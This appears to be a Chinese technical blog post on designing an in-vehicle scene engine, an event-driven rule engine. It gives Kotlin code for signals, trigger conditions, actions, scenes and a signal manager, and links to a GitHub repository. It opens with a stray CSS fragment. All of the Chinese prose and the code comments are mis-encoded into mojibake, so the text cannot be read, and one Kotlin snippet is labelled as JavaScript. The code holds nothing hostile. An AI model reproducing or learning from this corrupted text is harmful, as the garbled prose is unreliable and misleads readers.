(-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>åœ¨æ™ºèƒ½æ±½è½¦å¿«é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œè½¦è½½ç³»ç»Ÿæ—©å·²ä¸å†æ˜¯ç®€å•çš„å¨±ä¹æˆ–å¯¼èˆªå·¥å…·ï¼Œè€Œæ˜¯é›†æˆäº†æ„ŸçŸ¥ã€å†³ç­–ä¸æœåŠ¡äºä¸€ä½“çš„æ™ºèƒ½äº¤äº’å¹³å°ã€‚å…¶ä¸­ï¼Œâ€œ<strong>åœºæ™¯å¼•æ“</strong>â€ï¼ˆåˆç§°â€œ<strong>æ™ºèƒ½åœºæ™¯</strong>â€ï¼‰ä½œä¸ºæå‡ç”¨æˆ·ä½“éªŒã€å®ç°ä¸ªæ€§åŒ–æœåŠ¡çš„æ ¸å¿ƒèƒ½åŠ›ï¼Œæ­£è¢«è¶Šæ¥è¶Šå¤šçš„ä¸­é«˜ç«¯æ™ºèƒ½æ±½è½¦æ‰€é‡‡ç”¨ã€‚</p>
<p>æœ¬æ–‡å°†ç»“åˆç¬”è€…åœ¨å®é™…é¡¹ç›®ä¸­çš„å·¥ä½œç»éªŒï¼Œæ·±å…¥åˆ†æè½¦è½½â€œåœºæ™¯å¼•æ“â€çš„æ ¸å¿ƒéœ€æ±‚ï¼Œå¹¶æ¢è®¨å…¶é«˜æ•ˆè®¾è®¡æ–¹æ³•ã€‚å‡ºäºä¼ä¸šä¿å¯†è¦æ±‚ï¼Œæ–‡ä¸­æ‰€å‘ˆç°çš„åœºæ™¯å¼•æ“ä¸ºä¸€ä¸ªç®€åŒ–ç‰ˆçš„åŸå‹ï¼Œä»…ç”¨äºæŠ€æœ¯åŸç†çš„é˜è¿°ä¸äº¤æµã€‚</p>
<blockquote>
<p>æœ¬æ–‡æºç è·¯å¾„ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinxu-link%2FVehicleSceneEngine" target="_blank" title="https://github.com/linxu-link/VehicleSceneEngine" ref="nofollow noopener noreferrer">github.com/linxu-link/â€¦</a></p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯â€œåœºæ™¯å¼•æ“â€ï¼Ÿ</h2>
<p>ç®€å•æ¥è¯´ï¼Œåœºæ™¯å¼•æ“æ˜¯ä¸€ä¸ª<strong>åŸºäºå¤šç»´ä¸Šä¸‹æ–‡æ„ŸçŸ¥çš„è‡ªåŠ¨åŒ–å†³ç­–ä¸æ‰§è¡Œæ¡†æ¶</strong>ã€‚å®ƒèƒ½å¤Ÿå®æ—¶é‡‡é›†è½¦è¾†çŠ¶æ€ã€ç”¨æˆ·è¡Œä¸ºã€ç¯å¢ƒä¿¡æ¯ç­‰æ•°æ®ï¼Œåœ¨æ»¡è¶³é¢„è®¾æ¡ä»¶æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ä¸€ç³»åˆ—æœåŠ¡ç»„åˆï¼ˆå¦‚è°ƒèŠ‚ç©ºè°ƒã€åˆ‡æ¢åª’ä½“ã€å‘é€é€šçŸ¥ç­‰ï¼‰ã€‚</p>
<p>è™½ç„¶åº”ç”¨åœºæ™¯ä¸åŒï¼Œä½†å…¶åº•å±‚é€»è¾‘ä¸ Android ä¸­çš„â€œè§„åˆ™å¼•æ“â€â€œè‡ªåŠ¨åŒ–ä»»åŠ¡â€æˆ–â€œæƒ…å¢ƒæ„ŸçŸ¥åŠŸèƒ½â€ï¼ˆå¦‚ Do Not Disturbã€è‡ªé€‚åº”äº®åº¦ï¼‰éå¸¸ç›¸ä¼¼ã€‚</p>
<h3 data-id="heading-1">1. æ ¸å¿ƒéœ€æ±‚åˆ†æ</h3>
<p>ä¸€ä¸ªé«˜æ•ˆçš„åœºæ™¯å¼•æ“ï¼Œé¦–å…ˆä¾èµ–äºå¯¹<strong>å¤šæºä¸Šä¸‹æ–‡</strong>çš„å®æ—¶é‡‡é›†ä¸èåˆã€‚è¿™äº›ä¸Šä¸‹æ–‡å¯å½’çº³ä¸ºä»¥ä¸‹å››ç±»ï¼š</p>
<ul>
<li><strong>è®¾å¤‡/è½¦è¾†çŠ¶æ€</strong> å¦‚è½¦é€Ÿã€æ¡£ä½ã€ç”µé‡ã€è½¦é—¨/è½¦çª—çŠ¶æ€ã€ADASï¼ˆé«˜çº§é©¾é©¶è¾…åŠ©ç³»ç»Ÿï¼‰æ˜¯å¦å¯ç”¨ç­‰ã€‚</li>
<li><strong>ç”¨æˆ·çŠ¶æ€</strong> é€šè¿‡ FaceID æˆ–è´¦å·è¯†åˆ«é©¾é©¶å‘˜èº«ä»½ï¼Œç»“åˆ DMSï¼ˆé©¾é©¶å‘˜ç›‘æ§ç³»ç»Ÿï¼‰åˆ¤æ–­ç–²åŠ³åº¦ã€æ³¨æ„åŠ›ç­‰ã€‚</li>
<li><strong>ç¯å¢ƒä¿¡æ¯</strong> åŒ…æ‹¬ GPS ä½ç½®ã€å½“å‰æ—¶é—´ã€å¤©æ°”ã€è·¯å†µã€å®¤å†…å¤–æ¸©åº¦ç­‰ã€‚</li>
<li><strong>å¤–è®¾ä¸åº”ç”¨çŠ¶æ€</strong> æ‰‹æœºæ˜¯å¦è¿æ¥ã€è“ç‰™è€³æœºæ˜¯å¦é…å¯¹ã€åº§æ¤…ä½ç½®ã€ç©ºè°ƒè®¾ç½®ã€å½“å‰æ’­æ”¾çš„åª’ä½“ç­‰ã€‚</li>
</ul>
<p>è¿™äº›æ•°æ®å…±åŒæ„æˆäº†â€œä¸Šä¸‹æ–‡æ„ŸçŸ¥â€çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯è§¦å‘æ™ºèƒ½åœºæ™¯çš„å‰æã€‚</p>
<h3 data-id="heading-2">2. åœºæ™¯å®šä¹‰ä¸ç®¡ç†</h3>
<p>ä»…ä»…èƒ½æ„ŸçŸ¥è¿˜ä¸å¤Ÿï¼Œç³»ç»Ÿè¿˜éœ€æ”¯æŒ<strong>çµæ´»çš„åœºæ™¯ç¼–æ’</strong>ä¸<strong>å¯é çš„æ‰§è¡Œæœºåˆ¶</strong>ï¼š</p>
<ol>
<li>å¯è§†åŒ–è§„åˆ™ç¼–æ’</li>
</ol>
<ul>
<li>æ”¯æŒâ€œå¦‚æœâ€¦é‚£ä¹ˆâ€¦â€ï¼ˆIf-Thenï¼‰é€»è¾‘ï¼Œå…è®¸ OEM å‚å•†æˆ–ç»ˆç«¯ç”¨æˆ·è‡ªå®šä¹‰åœºæ™¯ã€‚</li>
</ul>
<blockquote>
<ul>
<li>ç¤ºä¾‹ï¼š<code>IF è½¦é€Ÿ &gt; 60km/h AND æ—¶é—´åœ¨ 22:00â€“6:00 â†’ è‡ªåŠ¨è°ƒæš—å±å¹• + å…³é—­é€šçŸ¥éŸ³</code></li>
</ul>
</blockquote>
<ul>
<li>æ”¯æŒå¤æ‚æ¡ä»¶ç»„åˆï¼ˆAND/OR/NOTï¼‰ã€æ—¶é—´çª—å£é™åˆ¶ã€çŠ¶æ€æŒç»­åˆ¤æ–­ï¼ˆå¦‚â€œè¿ç»­5åˆ†é’Ÿæœªæ“ä½œâ€ï¼‰ã€‚</li>
</ul>
<ol start="2">
<li>åœºæ™¯ä¼˜å…ˆçº§ä¸å†²çªå¤„ç†</li>
</ol>
<ul>
<li>å½“å¤šä¸ªåœºæ™¯åŒæ—¶æ»¡è¶³æ—¶ï¼Œéœ€æŒ‰<strong>å®‰å…¨ç­‰çº§</strong>æˆ–<strong>ç”¨æˆ·åå¥½</strong>è¿›è¡Œæ’åºï¼Œé¿å…æŒ‡ä»¤å†²çªã€‚</li>
<li>ä¾‹å¦‚ï¼šâ€œé©¾é©¶æ¨¡å¼â€åº”ä¼˜å…ˆäºâ€œè§‚å½±æ¨¡å¼â€ã€‚</li>
</ul>
<ol start="3">
<li>é¢„ç½® + è‡ªå­¦ä¹ åŒæ¨¡å¼</li>
</ol>
<ul>
<li>
<p><strong>å‡ºå‚é¢„ç½®é«˜é¢‘åœºæ™¯</strong>ï¼šå¦‚â€œå›å®¶æ¨¡å¼â€â€œéœ²è¥æ¨¡å¼â€â€œå„¿ç«¥æ¨¡å¼â€ï¼Œé™ä½ç”¨æˆ·ä½¿ç”¨é—¨æ§›ã€‚</p>
</li>
<li>
<p><strong>è¡Œä¸ºå­¦ä¹ ä¸æ¨è</strong>ï¼šéšç€å¤§æ¨¡å‹ä¸Šè½¦ï¼Œé€šè¿‡ AI å¤§æ¨¡å‹åˆ†æç”¨æˆ·ä¹ æƒ¯ï¼ˆå¦‚æ¯å¤© 18:00 è¿æ¥è“ç‰™ã€å‘¨äº”å¼€å¯åº§æ¤…åŠ çƒ­ï¼‰ï¼Œè‡ªåŠ¨ç”Ÿæˆå»ºè®®åœºæ™¯ï¼Œä¹Ÿå˜å¾—éå¸¸å¸¸è§ã€‚</p>
</li>
</ul>
<h3 data-id="heading-3">3. æ ¸å¿ƒè®¾è®¡æ€æƒ³ï¼šäº‹ä»¶é©±åŠ¨ä¸è§„åˆ™åŒ¹é…</h3>
<p>åœºæ™¯å¼•æ“çš„æœ¬è´¨ï¼Œæ˜¯ä¸€ä¸ª<strong>è½»é‡çº§è§„åˆ™å¼•æ“</strong>ï¼Œå…¶æ ¸å¿ƒæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šä»»ä½•ä¸Šä¸‹æ–‡ä¿¡å·çš„å˜åŒ–ï¼ˆå¦‚è½¦é€Ÿæ›´æ–°ã€æ—¶é—´è·³è½¬ï¼‰éƒ½ä½œä¸ºäº‹ä»¶è¾“å…¥ã€‚</li>
<li><strong>è§„åˆ™åŒ¹é…</strong>ï¼šæ¯ä¸ªåœºæ™¯å¯¹åº”ä¸€ç»„æ¡ä»¶è§„åˆ™ï¼Œå½“æ‰€æœ‰æ¡ä»¶æ»¡è¶³æ—¶ï¼Œè¯¥åœºæ™¯è¢«æ¿€æ´»ã€‚</li>
<li><strong>è§£è€¦ä¸å¯é…ç½®</strong>ï¼šè§„åˆ™åº”ä»¥ JSON/YAML æˆ–æ•°æ®åº“å½¢å¼å¤–éƒ¨åŒ–ï¼Œä¾¿äº OTA æ›´æ–°æˆ– A/B æµ‹è¯•ã€‚</li>
<li><strong>é«˜æ•ˆè¯„ä¼°</strong>ï¼šé¿å…æ¯æ¬¡å…¨é‡éå†æ‰€æœ‰è§„åˆ™ï¼Œé‡‡ç”¨å¢é‡æ›´æ–°ã€ç¼“å­˜æœºåˆ¶æˆ–åå‘ç´¢å¼•ä¼˜åŒ–æ€§èƒ½ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">äºŒã€æŠ€æœ¯å®ç°</h2>
<p>ä¸ºæ”¯æ’‘â€œ<strong>æ„ŸçŸ¥-å†³ç­–-æ‰§è¡Œ</strong>â€é—­ç¯ï¼ŒåŸºäº Kotlin åç¨‹ä¸å“åº”å¼æ€æƒ³ï¼Œæ„å»ºäº†ä¸€å¥—è½»é‡çº§ã€çº¿ç¨‹å®‰å…¨çš„åœºæ™¯å¼•æ“å®ç°ã€‚æ•´ä½“æ¶æ„éµå¾ª <strong>ä¿¡å·é©±åŠ¨ + è§„åˆ™åŒ¹é… + åŠ¨ä½œå›è°ƒ</strong> ï¼Œæ ¸å¿ƒæ¨¡å—å¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-5">1. æ ¸å¿ƒæ•°æ®æ¨¡å‹</h3>
<ul>
<li><code>Signal</code>ï¼šä»£è¡¨ä¸Šä¸‹æ–‡ä¸­çš„ä¸€ä¸ªåŸå­çŠ¶æ€å˜åŒ–ï¼ˆå¦‚ <code>speed=90</code>ï¼‰ï¼Œç”± <code>SignalManager</code> ç»Ÿä¸€ç®¡ç†ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Signal</span>(
    <span class="hljs-keyword">val</span> key: String,
    <span class="hljs-keyword">val</span> value: Any
)
</code></pre>
<ul>
<li><code>Condition</code>ï¼šå®šä¹‰è§¦å‘æ¡ä»¶ï¼Œé‡‡ç”¨å¯†å°ç±»ï¼ˆ<code>sealed interface</code>ï¼‰æ”¯æŒå¤šç§åˆ¤æ–­é€»è¾‘ï¼ˆç­‰äºã€å¤§äºã€åœ¨é›†åˆä¸­ç­‰ï¼‰ï¼Œå¹¶å†…å»º <code>durationMs</code> å­—æ®µä»¥æ”¯æŒâ€œæŒç»­æ»¡è¶³ N ç§’æ‰è§¦å‘â€çš„è¯­ä¹‰ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    <span class="hljs-keyword">val</span> signalKey: String
    <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span>

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šç›¸ç­‰
* keyï¼šä¿¡å·é”®
* expectedï¼šæœŸæœ›çš„å€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Equals</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> expected: Any, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) : Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šå¤§äº
* keyï¼šä¿¡å·é”®
* thresholdï¼šé˜ˆå€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreaterThan</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> threshold: Number, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) :
        Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šå°äº
* keyï¼šä¿¡å·é”®
* thresholdï¼šé˜ˆå€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LessThan</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> threshold: Number, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) :
        Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }


    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šåŒ…å«
* keyï¼šä¿¡å·é”®
* valueï¼šåŒ…å«çš„å€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Contains</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> value: Any, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) : Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/**
* è§¦å‘æ¡ä»¶ï¼šåœ¨èŒƒå›´å†…
* keyï¼šä¿¡å·é”®
* startï¼šå¼€å§‹å€¼
* endï¼šç»“æŸå€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Between</span>(
        <span class="hljs-keyword">val</span> key: String,
        <span class="hljs-keyword">val</span> start: Number,
        <span class="hljs-keyword">val</span> end: Number,
        <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>
    ) : Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

    <span class="hljs-comment">/***
* è§¦å‘æ¡ä»¶ï¼šåœ¨é›†åˆä¸­
* keyï¼šä¿¡å·é”®
* allowedValuesï¼šå…è®¸çš„å€¼
* durationï¼šæŒç»­æ—¶é—´ï¼Œå•ä½æ¯«ç§’
*/</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InSet</span>(<span class="hljs-keyword">val</span> key: String, <span class="hljs-keyword">val</span> allowedValues: Set&lt;Any&gt;, <span class="hljs-keyword">val</span> duration: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>) :
        Condition {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = key
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = duration
    }

}
</code></pre>
<ul>
<li><code>Action</code>ï¼šæè¿°è¦æ‰§è¡Œçš„æ“ä½œï¼ˆå¦‚ <code>enable_eco_mode</code>ï¼‰ï¼Œæºå¸¦å‚æ•°å­—å…¸ï¼Œä¾¿äºå¤–éƒ¨ç³»ç»Ÿè§£ææ‰§è¡Œã€‚</li>
</ul>
<blockquote>
<p>æ­¤å¤„å·²ç»é«˜åº¦ç®€åŒ–ï¼Œå®é™…é¡¹ç›®ä¸­è¯·æ ¹æ®äº§å“éœ€æ±‚è¿›è¡Œæ‰©å±•ã€‚</p>
</blockquote>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Action</span>(
    val <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,
    val <span class="hljs-attr">params</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Any</span>&gt; = <span class="hljs-title function_">emptyMap</span>()
)
</code></pre>
<ul>
<li><code>Scene</code>ï¼šåœºæ™¯çš„æ ¸å¿ƒè½½ä½“ï¼ŒåŒ…å«è¿›å…¥/é€€å‡ºæ¡ä»¶åˆ—è¡¨ã€è¿›å…¥/é€€å‡ºåŠ¨ä½œåˆ—è¡¨ï¼Œä»¥åŠå¯è®¢é˜…çš„ <code>onEnter</code>/<code>onExit</code> å›è°ƒã€‚ä½¿ç”¨ <code>AtomicReference</code> ç®¡ç†ç›‘å¬å™¨åˆ—è¡¨ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨ä¸‹çš„åŠ¨æ€æ‰©å±•èƒ½åŠ›ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">typealias</span> SceneAction = (List&lt;Action&gt;) -&gt; <span class="hljs-built_in">Unit</span>

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Scene</span>(
    <span class="hljs-keyword">val</span> id: String,
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">val</span> enterConditions: List&lt;Condition&gt;,
    <span class="hljs-keyword">val</span> exitConditions: List&lt;Condition&gt;,
    <span class="hljs-keyword">val</span> enterActions: List&lt;Action&gt;,
    <span class="hljs-keyword">val</span> exitActions: List&lt;Action&gt;,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _onEnterListeners: AtomicReference&lt;List&lt;SceneAction&gt;&gt;,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _onExitListeners: AtomicReference&lt;List&lt;SceneAction&gt;&gt;
) {
    <span class="hljs-comment">// å¯¹å¤–æš´éœ²çš„ onEnter / onExit</span>
    <span class="hljs-keyword">val</span> onEnter: SceneAction = { actions -&gt;
_onEnterListeners.<span class="hljs-keyword">get</span>().forEach {
it(actions)
        }
}

<span class="hljs-keyword">val</span> onExit: SceneAction = { actions -&gt;
 synchronized(_onExitListeners) {
_onExitListeners.<span class="hljs-keyword">get</span>().forEach {
it(actions)
            }
}
}

 <span class="hljs-comment">/**
* å¿½ç•¥è§¦å‘æ¡ä»¶ï¼Œç›´æ¥æ‰§è¡Œåœºæ™¯
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">enter</span><span class="hljs-params">()</span></span> {
        onEnter(enterActions)
    }

    <span class="hljs-comment">/**
* å¿½ç•¥é€€å‡ºæ¡ä»¶ï¼Œç›´æ¥é€€å‡ºåœºæ™¯
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">exit</span><span class="hljs-params">()</span></span> {
        onExit(exitActions)
    }

    <span class="hljs-comment">/**
* è®¢é˜…æ–°çš„è¿›å…¥/é€€å‡ºå›è°ƒ
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">subscribe</span><span class="hljs-params">(onEnter: <span class="hljs-type">SceneAction</span>, onExit: <span class="hljs-type">SceneAction</span>)</span></span> {
        _onEnterListeners.updateAndGet { list -&gt; list + onEnter }
        _onExitListeners.updateAndGet { list -&gt; list + onExit }
}

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">(
            id: <span class="hljs-type">String</span>,
            name: <span class="hljs-type">String</span>,
            enterConditions: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Condition</span>&gt; = emptyList()</span></span>,
            exitConditions: List&lt;Condition&gt; = emptyList(),
            enterActions: List&lt;Action&gt; = emptyList(),
            exitActions: List&lt;Action&gt; = emptyList(),
            onEnter: SceneAction = {} ,
            onExit: SceneAction = {}
): Scene {
            <span class="hljs-keyword">return</span> Scene(
                id = id,
                name = name,
                enterConditions = enterConditions,
                exitConditions = exitConditions,
                enterActions = enterActions,
                exitActions = exitActions,
                _onEnterListeners = AtomicReference(listOf(onEnter)),
                _onExitListeners = AtomicReference(listOf(onExit))
            )
        }
    }
}
</code></pre>
<h3 data-id="heading-6">2. ä¿¡å·ä¸­æ¢ï¼š<code>SignalManager</code></h3>
<p>ä½œä¸ºå…¨å±€å•ä¾‹ï¼Œ<code>SignalManager</code> è´Ÿè´£ï¼š</p>
<ul>
<li>ç»´æŠ¤å½“å‰æ‰€æœ‰ä¿¡å·çš„æœ€æ–°å€¼å¿«ç…§ï¼ˆ<code>currentSignals</code>ï¼‰ï¼›</li>
<li>æä¾› <code>updateSignal()</code> æ¥å£ä¾›<code>CarService</code>æˆ–ç³»ç»ŸæœåŠ¡æ¨é€çŠ¶æ€å˜æ›´ï¼›</li>
<li>æ”¯æŒå¤šè§‚å¯Ÿè€…è®¢é˜…ï¼ˆ<code>subscribe</code>ï¼‰ï¼Œå½“ä»»ä¸€ä¿¡å·æ›´æ–°æ—¶ï¼Œå¹¿æ’­ç»™æ‰€æœ‰ç›‘å¬è€…ã€‚</li>
</ul>
<p>è®¾è®¡ä¸Šæ•°æ®æºä¸æ¶ˆè´¹é€»è¾‘çš„è§£è€¦ï¼Œä»»ä½•æ¨¡å—åªéœ€ç›‘å¬ä¿¡å·å˜åŒ–å³å¯å‚ä¸åœºæ™¯è¯„ä¼°ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"> <span class="hljs-comment">/**
* ä¿¡å·ç®¡ç†å™¨ï¼Œç”¨äºç®¡ç†æ‰€æœ‰ä¿¡å·çš„å˜åŒ–å’Œè®¢é˜…
* è½¦è½½åº”ç”¨ä¸­ï¼Œä¼šå¯¹æ¥CarServiceå’Œå…¶ä»–ä¼ æ„Ÿå™¨ï¼Œå¹¶åœ¨åº”ç”¨å¯åŠ¨åç«‹å³å°†æ‰€æœ‰ä¿¡å·æ›´æ–°åˆ°ä¿¡å·ç®¡ç†å™¨ä¸­
*/</span>
<span class="hljs-keyword">object</span> SignalManager {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> currentSignals = mutableMapOf&lt;String, Any&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> listeners = mutableListOf&lt;SignalListener&gt;()

    <span class="hljs-comment">/**
* æ›´æ–°ä¿¡å·å€¼ï¼Œå¹¶é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateSignal</span><span class="hljs-params">(signal: <span class="hljs-type">Signal</span>)</span></span> {
        println(<span class="hljs-string">"[updateSignal]: <span class="hljs-variable">$signal</span>"</span>)
        currentSignals[signal.key] = signal.value
        listeners.forEach { it(signal) }
}

    <span class="hljs-comment">/**
* è·å–å½“å‰ä¿¡å·å€¼
* <span class="hljs-doctag">@param</span> key ä¿¡å·é”®å€¼
* <span class="hljs-doctag">@return</span> å½“å‰ä¿¡å·å€¼ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¿”å›null
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCurrentValue</span><span class="hljs-params">(key: <span class="hljs-type">String</span>)</span></span>: Any? = currentSignals[key]

    <span class="hljs-comment">/**
* è®¢é˜…ä¿¡å·å˜åŒ–ï¼Œå¹¶æ³¨å†Œç›‘å¬å™¨
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">subscribe</span><span class="hljs-params">(listener: (<span class="hljs-type">Signal</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        listeners.add(listener)
    }

    <span class="hljs-comment">/**
* å–æ¶ˆè®¢é˜…ï¼Œç§»é™¤ç›‘å¬å™¨
*/</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unsubscribe</span><span class="hljs-params">(listener: (<span class="hljs-type">Signal</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        listeners.remove(listener)
    }
}
</code></pre>
<h3 data-id="heading-7">3. è§„åˆ™å¼•æ“ï¼š<code>RuleEngine</code></h3>
<p><code>RuleEngine</code> æ˜¯æ•´ä¸ªç³»ç»Ÿçš„è°ƒåº¦æ ¸å¿ƒï¼Œå…¶å…³é”®è®¾è®¡åŒ…æ‹¬ï¼š</p>
<ul>
<li>åå‘ç´¢å¼•ä¼˜åŒ–ï¼šæ„å»º <code>signalKey â†’ [sceneId]</code> çš„æ˜ å°„ï¼ˆåˆ†ä¸ºè¿›å…¥/é€€å‡ºä¸¤å¥—ï¼‰ï¼Œä½¿å¾—æ¯æ¬¡ä¿¡å·æ›´æ–°ä»…éœ€è¯„ä¼°å¯èƒ½å—å½±å“çš„åœºæ™¯ï¼Œé¿å…å…¨é‡æ‰«æï¼Œæ˜¾è‘—æå‡æ€§èƒ½ã€‚</li>
<li>çŠ¶æ€æŒä¹…åŒ–ï¼šä½¿ç”¨ <code>enterStates</code> / <code>exitStates</code> è®°å½•æ¯ä¸ªæ¡ä»¶çš„é¦–æ¬¡æ»¡è¶³æ—¶é—´æˆ³ï¼Œç”¨äºè®¡ç®—æ˜¯å¦è¾¾åˆ° <code>duration</code> è¦æ±‚ã€‚</li>
<li>åç¨‹è°ƒåº¦ï¼šåˆ©ç”¨ <code>kotlinx.coroutines</code> å®ç°å»¶è¿Ÿé‡è¯„ã€‚å½“æ¡ä»¶æ»¡è¶³ä½†æœªè¾¾æŒç»­æ—¶é—´æ—¶ï¼Œè‡ªåŠ¨è°ƒåº¦ä¸€ä¸ªå»¶è¿Ÿä»»åŠ¡ï¼Œåœ¨ç²¾ç¡®æ—¶åˆ»é‡æ–°è¯„ä¼°ï¼Œé¿å…è½®è¯¢å¼€é”€ã€‚</li>
<li>åºåˆ—è¿½è¸ªï¼šé€šè¿‡ <code>sequenceProgress</code> å’Œ <code>lastStepTimestamp</code> ä¸¤ä¸ªå¹¶å‘å®‰å…¨çš„ Mapï¼Œè®°å½•æ¯ä¸ªåœºæ™¯åœ¨åºåˆ—åŒ¹é…ä¸­çš„å½“å‰è¿›åº¦ä¸ä¸Šä¸€æ­¥å®Œæˆæ—¶é—´ï¼Œç¡®ä¿æ—¶åºé€»è¾‘æ­£ç¡®ã€‚</li>
</ul>
<p>ä»£ç å¤ªé•¿ï¼Œå®Œæ•´ä»£ç è¯·å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinxu-link%2FVehicleSceneEngine%2Fblob%2Fmaster%2Fapp%2Fsrc%2Fmain%2Fjava%2Fcom%2Fwj%2Fsceneengine%2Fengine%2FRuleEngine.kt" target="_blank" title="https://github.com/linxu-link/VehicleSceneEngine/blob/master/app/src/main/java/com/wj/sceneengine/engine/RuleEngine.kt" ref="nofollow noopener noreferrer">github.com/linxu-link/â€¦</a></p>
<hr/>
